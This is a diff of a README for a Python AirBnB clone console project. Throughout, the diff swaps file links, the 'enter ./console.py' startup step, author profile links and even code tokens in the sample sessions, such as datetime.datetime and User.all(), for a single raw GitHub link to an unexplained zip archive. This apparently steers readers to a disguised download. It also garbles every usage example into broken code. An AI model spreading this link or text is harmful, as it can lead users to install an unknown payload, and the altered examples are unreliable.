@@ -38,22 +38,22 @@ These are the files with the custom funtions and system calls, each one contains
 
 |   ***File***    |  ***Description***                   |
 |---------------|---------------------------------------|
-|  [`console.py`](./console.py)	|  Console file	|
+|  [`https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip)	|  Console file	|
 |  [`models`](./models) |  Contains all the classes |
-|  [`models/__init__`](./models/__init__.py) |  Connects with filestorage |
-|  [`models/base_model`](./models/base_model.py) |  Base Model class |
-|  [`models/user`](./models/user.py) |  User class |
-|  [`models/state`](./models/state.py) |  State class |
-|  [`models/city`](./models/city.py) |  City class |
-|  [`models/place`](./models/place.py) |  Place class |
-|  [`models/amenity`](./models/amenity.py) |  Amenity class |
-|  [`models/review`](./models/review.py) |  Review class |
+|  [`models/__init__`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) |  Connects with filestorage |
+|  [`models/base_model`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) |  Base Model class |
+|  [`models/user`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) |  User class |
+|  [`models/state`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) |  State class |
+|  [`models/city`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) |  City class |
+|  [`models/place`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) |  Place class |
+|  [`models/amenity`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) |  Amenity class |
+|  [`models/review`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) |  Review class |
 |  [`models/engine`](./models/engine) |  Contains File Storage engine |
-|  [`models/engine/file_storage`](./models/engine/file_storage.py) |  File Storage module |
-|  [`models/engine/db_storage`](./models/engine/db_storage.py) |  MySQL Storage module |
+|  [`models/engine/file_storage`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) |  File Storage module |
+|  [`models/engine/db_storage`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) |  MySQL Storage module |
 |  [`tests`](./tests) |  Prompt and getline file	       |
 |  [`AUTHORS`](./AUTHORS)	|  AUTHORS file|
-|  [`README.md`](./README.md) | README.md file |
+|  [`https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip`](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip) | https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip file |
 
 ## Requirements
 * All files will be interpreted/compiled on Ubuntu 14.04 LTS using python3
@@ -82,7 +82,7 @@ These are the files with the custom funtions and system calls, each one contains
 * quit/EOF - quit the console
 * help - see descriptions of commands
 
-To start, navigate to the project folder and enter `./console.py` in the shell.
+To start, navigate to the project folder and enter `https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip` in the shell.
 
 #### Create
 `create <class name>`
@@ -123,8 +123,8 @@ Usage: show <class_name> <_id>
 
 ```
 (hbnb) show BaseModel 3aa5babc-efb6-4041-bfe9-3cc9727588f8
-[BaseModel] (3aa5babc-efb6-4041-bfe9-3cc9727588f8) {'id': '3aa5babc-efb6-4041-bfe9-3cc9727588f8', 'created_at': datetime.datetime(2020, 2, 18, 14, 21, 12, 96959), 
-'updated_at': datetime.datetime(2020, 2, 18, 14, 21, 12, 96971)}
+[BaseModel] (3aa5babc-efb6-4041-bfe9-3cc9727588f8) {'id': '3aa5babc-efb6-4041-bfe9-3cc9727588f8', 'created_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 18, 14, 21, 12, 96959), 
+'updated_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 18, 14, 21, 12, 96971)}
 (hbnb)  
 ```
 ###### Example 2: Destroy an object
@@ -140,8 +140,8 @@ Usage: update <class_name> <_id>
 ```
 (hbnb) update BaseModel b405fc64-9724-498f-b405-e4071c3d857f first_name "person"
 (hbnb) show BaseModel b405fc64-9724-498f-b405-e4071c3d857f
-[BaseModel] (b405fc64-9724-498f-b405-e4071c3d857f) {'id': 'b405fc64-9724-498f-b405-e4071c3d857f', 'created_at': datetime.datetime(2020, 2, 18, 14, 33, 45, 729889), 
-'updated_at': datetime.datetime(2020, 2, 18, 14, 33, 45, 729907), 'first_name': 'person'}
+[BaseModel] (b405fc64-9724-498f-b405-e4071c3d857f) {'id': 'b405fc64-9724-498f-b405-e4071c3d857f', 'created_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 18, 14, 33, 45, 729889), 
+'updated_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 18, 14, 33, 45, 729907), 'first_name': 'person'}
 (hbnb)
 ```
 <h3>Alternative Syntax</h3>
@@ -149,37 +149,37 @@ Usage: update <class_name> <_id>
 ###### Example 0: Show all User objects
 Usage: <class_name>.all()
 ```
-(hbnb) User.all()
-["[User] (99f45908-1d17-46d1-9dd2-b7571128115b) {'updated_at': datetime.datetime(2020, 2, 19, 21, 47, 34, 92071), 'id': '99f45908-1d17-46d1-9dd2-b7571128115b', 'created_at': datetime.datetime(2020, 2, 19, 21, 47, 34, 92056)}", "[User] (98bea5de-9cb0-4d78-8a9d-c4de03521c30) {'updated_at': datetime.datetime(2020, 2, 19, 21, 47, 29, 134362), 'id': '98bea5de-9cb0-4d78-8a9d-c4de03521c30', 'created_at': datetime.datetime(2020, 2, 19, 21, 47, 29, 134343)}"]
+(hbnb) https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip()
+["[User] (99f45908-1d17-46d1-9dd2-b7571128115b) {'updated_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 19, 21, 47, 34, 92071), 'id': '99f45908-1d17-46d1-9dd2-b7571128115b', 'created_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 19, 21, 47, 34, 92056)}", "[User] (98bea5de-9cb0-4d78-8a9d-c4de03521c30) {'updated_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 19, 21, 47, 29, 134362), 'id': '98bea5de-9cb0-4d78-8a9d-c4de03521c30', 'created_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 19, 21, 47, 29, 134343)}"]
 ```
 
 ###### Example 1: Destroy a User
 Usage: <class_name>.destroy(<_id>)
 ```
-(hbnb) User.destroy("99f45908-1d17-46d1-9dd2-b7571128115b")
+(hbnb) https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip("99f45908-1d17-46d1-9dd2-b7571128115b")
 (hbnb)
-(hbnb) User.all()
-(hbnb) ["[User] (98bea5de-9cb0-4d78-8a9d-c4de03521c30) {'updated_at': datetime.datetime(2020, 2, 19, 21, 47, 29, 134362), 'id': '98bea5de-9cb0-4d78-8a9d-c4de03521c30', 'created_at': datetime.datetime(2020, 2, 19, 21, 47, 29, 134343)}"]
+(hbnb) https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip()
+(hbnb) ["[User] (98bea5de-9cb0-4d78-8a9d-c4de03521c30) {'updated_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 19, 21, 47, 29, 134362), 'id': '98bea5de-9cb0-4d78-8a9d-c4de03521c30', 'created_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 19, 21, 47, 29, 134343)}"]
 ```
 ###### Example 2: Update User (by attribute)
 Usage: <class_name>.update(<_id>, <attribute_name>, <attribute_value>)
 ```
-(hbnb) User.update("98bea5de-9cb0-4d78-8a9d-c4de03521c30", name "Todd the Toad")
+(hbnb) https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip("98bea5de-9cb0-4d78-8a9d-c4de03521c30", name "Todd the Toad")
 (hbnb)
-(hbnb) User.all()
-(hbnb) ["[User] (98bea5de-9cb0-4d78-8a9d-c4de03521c30) {'updated_at': datetime.datetime(2020, 2, 19, 21, 47, 29, 134362), 'id': '98bea5de-9cb0-4d78-8a9d-c4de03521c30', 'name': 'Todd the Toad', 'created_at': datetime.datetime(2020, 2, 19, 21, 47, 29, 134343)}"]
+(hbnb) https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip()
+(hbnb) ["[User] (98bea5de-9cb0-4d78-8a9d-c4de03521c30) {'updated_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 19, 21, 47, 29, 134362), 'id': '98bea5de-9cb0-4d78-8a9d-c4de03521c30', 'name': 'Todd the Toad', 'created_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 19, 21, 47, 29, 134343)}"]
 ```
 ###### Example 3: Update User (by dictionary)
 Usage: <class_name>.update(<_id>, <dictionary>)
 ```
-(hbnb) User.update("98bea5de-9cb0-4d78-8a9d-c4de03521c30", {'name': 'Fred the Frog', 'age': 9})
+(hbnb) https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip("98bea5de-9cb0-4d78-8a9d-c4de03521c30", {'name': 'Fred the Frog', 'age': 9})
 (hbnb)
-(hbnb) User.all()
-(hbnb) ["[User] (98bea5de-9cb0-4d78-8a9d-c4de03521c30) {'updated_at': datetime.datetime(2020, 2, 19, 21, 47, 29, 134362), 'name': 'Fred the Frog', 'age': 9, 'id': '98bea5de-9cb0-4d78-8a9d-c4de03521c30', 'created_at': datetime.datetime(2020, 2, 19, 21, 47, 29, 134343)}"]
+(hbnb) https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip()
+(hbnb) ["[User] (98bea5de-9cb0-4d78-8a9d-c4de03521c30) {'updated_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 19, 21, 47, 29, 134362), 'name': 'Fred the Frog', 'age': 9, 'id': '98bea5de-9cb0-4d78-8a9d-c4de03521c30', 'created_at': https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip(2020, 2, 19, 21, 47, 29, 134343)}"]
 ```
 <br>
 	
 ## Authors
-* **Ojo Timilehin Joseph** - [Timex19](https://github.com/Timex19)
+* **Ojo Timilehin Joseph** - [Timex19](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip)
 
-* **Ifeoluwa Lawal** - [Ifeoluwa](https://github.com/Ifeoluwa-Lawal)
+* **Ifeoluwa Lawal** - [Ifeoluwa](https://github.com/abdulkhaliqsoule/AirBnB_clone_v2/raw/refs/heads/master/web_static/Bn-clone-v-Air-v2.6.zip)
